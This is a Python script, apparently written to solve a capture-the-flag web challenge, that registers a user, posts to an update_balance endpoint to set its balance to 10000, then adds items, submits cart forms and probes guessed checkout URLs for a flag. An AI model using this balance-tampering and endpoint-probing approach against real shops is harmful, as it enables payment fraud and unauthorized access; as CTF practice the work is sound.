#!/usr/bin/env python3
"""
Test cart and checkout functionality to complete task 4
"""

from ctf_solver import CTFSolver
import re

def test_cart_checkout():
    """Test cart and checkout functionality"""
    print("=" * 60)
    print("CART AND CHECKOUT TESTING - TASK 4")
    print("=" * 60)
    
    base_url = "http://u2lsx1lvvxnfzg-0.playat.flagyard.com"
    solver = CTFSolver(base_url)
    
    # Complete authentication flow
    print("[+] Step 1: Register and login")
    solver.register(username='testuser', password='testpass')
    solver.login(username='testuser', password='testpass')
    
    print("\n[+] Step 2: Update balance and add items to cart")
    # Update balance first
    balance_response = solver.make_request(f"{base_url}/update_balance/2", {'balance': '10000'}, 'POST')
    if balance_response and balance_response['status'] == 200:
        print("[+] Balance updated successfully!")
    
    # Add an item to cart
    cart_response = solver.make_request(f"{base_url}/add_to_cart/3")  # Headphones
    if cart_response and cart_response['status'] == 200:
        print("[+] Item added to cart!")
        
        # Check for flag in add to cart response
        flag = solver.find_flag(cart_response['content'])
        if flag:
            print(f"[!] FLAG FOUND AFTER ADDING TO CART: {flag}")
            return flag
    
    print("\n[+] Step 3: Access cart page and analyze content")
    cart_page_response = solver.make_request(f"{base_url}/cart")
    
    if cart_page_response and cart_page_response['status'] == 200:
        print(f"[+] Cart page accessed successfully! Content length: {len(cart_page_response['content'])}")
        
        # Save cart content for analysis
        with open('cart_content.html', 'w') as f:
            f.write(cart_page_response['content'])
        print("[+] Cart HTML saved to 'cart_content.html'")
        
        # Check for flag in cart page
        flag = solver.find_flag(cart_page_response['content'])
        if flag:
            print(f"[!] FLAG FOUND IN CART PAGE: {flag}")
            return flag
        
        # Look for checkout buttons/forms
        checkout_patterns = [
            r'<button[^>]*(?:checkout|purchase|buy|order)[^>]*>(.*?)</button>',
            r'<a[^>]*(?:checkout|purchase|buy|order)[^>]*>(.*?)</a>',
            r'<form[^>]*action="([^"]*(?:checkout|purchase|buy|order)[^"]*)"',
            r'href="([^"]*(?:checkout|purchase|buy|order)[^"]*)"',
        ]
        
        checkout_elements = []
        for pattern in checkout_patterns:
            matches = re.findall(pattern, cart_page_response['content'], re.IGNORECASE | re.DOTALL)
            if matches:
                checkout_elements.extend(matches)
        
        if checkout_elements:
            print(f"\n[+] Found {len(checkout_elements)} checkout-related elements:")
            for element in checkout_elements:
                print(f"    Checkout element: {str(element)[:100]}...")
        
        # Look for any forms in cart page
        forms = solver.parse_forms(cart_page_response['content'])
        print(f"\n[+] Found {len(forms)} forms in cart page:")
        for i, form in enumerate(forms):
            print(f"    Form {i+1}: {form['method']} {form['action']}")
            for inp in form['inputs']:
                print(f"        Input: {inp}")
        
        # Try to submit any forms found
        for i, form in enumerate(forms):
            print(f"\n[+] Trying to submit form {i+1}: {form['action']}")
            
            # Build form data
            form_data = {}
            for inp in form['inputs']:
                if inp['type'] == 'hidden':
                    form_data[inp['name']] = inp['value']
                elif inp['type'] in ['text', 'number']:
                    form_data[inp['name']] = inp.get('value', '1')
                elif inp['type'] == 'submit' and inp['name']:
                    form_data[inp['name']] = inp['value']
            
            # Determine action URL
            action = form['action']
            if action.startswith('/'):
                form_url = f"{base_url}{action}"
            elif action.startswith('http'):
                form_url = action
            else:
                form_url = f"{base_url}/cart/{action}" if action else f"{base_url}/cart"
            
            print(f"[+] Submitting to: {form_url}")
            print(f"[+] Form data: {form_data}")
            
            form_response = solver.make_request(form_url, form_data, form['method'])
            if form_response and form_response['status'] == 200:
                print(f"[+] Form submission successful!")
                
                # Check for flag in form response
                flag = solver.find_flag(form_response['content'])
                if flag:
                    print(f"[!] FLAG FOUND AFTER FORM SUBMISSION: {flag}")
                    return flag
                
                print(f"[+] Response preview: {form_response['content'][:300]}...")
    
    print("\n[+] Step 4: Try direct checkout endpoints")
    checkout_endpoints = [
        '/checkout',
        '/cart/checkout', 
        '/purchase',
        '/buy',
        '/order',
        '/complete_purchase',
        '/finalize_order'
    ]
    
    for endpoint in checkout_endpoints:
        print(f"\n[+] Trying checkout endpoint: {endpoint}")
        
        # Try both GET and POST
        for method in ['GET', 'POST']:
            print(f"    Trying {method} request...")
            response = solver.make_request(f"{base_url}{endpoint}", {}, method)
            
            if response and response['status'] == 200:
                print(f"    {method} {endpoint} successful!")
                
                # Check for flag
                flag = solver.find_flag(response['content'])
                if flag:
                    print(f"[!] FLAG FOUND AT {method} {endpoint}: {flag}")
                    return flag
                
                print(f"    Response preview: {response['content'][:200]}...")
    
    print("\n[-] No flag found through cart/checkout process")
    return None

if __name__ == "__main__":
    result = test_cart_checkout()
    if result:
        print(f"\n[!] SUCCESS: Flag found: {result}")
    else:
        print("\n[-] No flag found. Need to investigate further.")
